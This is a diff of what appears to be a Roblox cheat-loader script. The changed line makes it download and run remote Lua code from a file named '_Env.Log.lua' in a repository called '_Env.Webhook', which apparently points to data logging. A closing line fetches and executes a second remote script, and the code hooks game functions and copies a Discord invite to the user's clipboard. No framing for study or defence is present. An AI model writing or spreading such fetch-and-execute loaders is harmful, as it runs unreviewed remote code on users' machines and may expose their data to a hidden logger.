@@ -1,3 +1,4 @@
-loadstring(game:HttpGet("https://github.com/obfalchx/_Env.Webhook/raw/refs/heads/main/_Env.Mirage.lua"))()
+loadstring(game:HttpGet("https://github.com/obfalchx/_Env.Webhook/raw/refs/heads/main/_Env.Log.lua"))()
 setclipboard("https://discord.com/invite/E2N7w35zkt")
 hookfunction(require((game:GetService("ReplicatedStorage")).Effect.Container.Respawn),function() end)hookfunction((require((game:GetService("ReplicatedStorage")):WaitForChild("GuideModule"))).ChangeDisplayedNPC,function() end)spawn(function()for u,i in pairs(game:GetDescendants())do if i:IsA("Texture")then i.Texture=""elseif i:IsA("BasePart")and i.Material==Enum.Material.Water then i.Material=Enum.Material.SmoothPlastic end end for u,i in pairs(game.Players.LocalPlayer.PlayerScripts:GetDescendants())do local M={"WaterBlur";"WaterEffect";"WaterColorCorrection","WaterCFrame";"MirageFog"}if table.find(M,i.Name)then i:Destroy()end end end);(loadstring(game:HttpGet("https://raw.githubusercontent.com/AnhAnDz/Library/refs/heads/main/Module-Fast.luau")))()
+
